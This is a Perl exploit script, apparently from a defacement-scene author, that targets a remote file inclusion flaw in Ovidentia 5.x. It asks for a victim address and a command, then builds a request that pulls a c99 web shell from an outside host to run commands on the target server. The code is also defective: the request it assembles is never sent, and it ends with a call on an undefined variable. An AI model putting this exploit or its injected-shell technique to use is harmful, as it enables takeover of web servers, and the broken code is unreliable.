#[ Author : H0tTurk-]
#[ Author2: Hotturk
#[ web app : OVidentia 5.x Series Remote File &#304;nclude ]
#[ My Site : WwW.H0tTurk.CoM ]
#[Referance:http://www.securityfocus.com/archive/1/456893
#[ Thanx : DrmaxVirus,GencTurk,Madconfig,EnjexioN,TiT,Kurtefendy,LuciferCihan,Arabian-FighterZ,Sawturk,Ayy&#305;ld&#305;z,OzelHarekatTim f4cked238 ]
# ________######________________
# ______##########______________
# _____#############____________
# ____##############____________
# ___#######______###___________
# ___######________##__##_______
# ___######____________###______
# ___#####___H0tTurk___######___
# ___#####____________#######___
# ___#####___________#######____
# ___#####____________######____
# ___#####_____________######___
# ___######____________###_##___
# ____######_______#___##_______
# ____#######____###____________
# _____############_____________
# ______##########______________
# ________######________________
#
#
#
$rfi = "index.php?babInstallPath=";
$path = "/";
$shell = "http://redhat.by.ru/c99.txt?cmd=";
print "Language: English // Turkish\nPlz Select Lang:\n"; $dil = <STDIN>; chop($dil);
if($dil eq "English"){
print "(c) H0tTurk\n";
&ex;
}
elsif($dil eq "Turkce"){
print "H0tTurk\n";
&ex;
}
else {print "Selection Language\n"; exit;}
sub ex{
$not = "Victim is Not Vunl.\n" and $not_cmd = "Victim is Vunl but Not doing Exec.\n"
and $vic = "Evil Adress? with start http:// :" and $thx = "Good " and $diz = "Dictionary?:" and $komt = "Command?:"
if $dil eq "English";
$not = "Not Found\n" and $not_cmd = "Error Rfi\n"
and $vic = "Example http:// ile baslayan:" and $diz = "Dizin?: " and $thx = "Sagol " and $komt = "Command?:"
if $dil eq "Turkce";
print "$vic";
$victim = <STDIN>;
chop($victim);
print "$diz";
$dizn = <STDIN>;
chop($dizn);
$dizin = $dizn;
$dizin = "/" if !$dizn;
print "$komt";
$cmd = <STDIN>;
chop($cmd);
$cmmd = $cmd;
$cmmd = "dir" if !$cmd;
$site = $victim;
$site = "http://$victim" if !($victim =~ /http/);
$acacaz = "$site$dizin$rfi$shell$cmmd";
print "(c) H0tTurk AyT\n$g3rt: Drmax\n";
sleep 3;
system("start $wait");
}
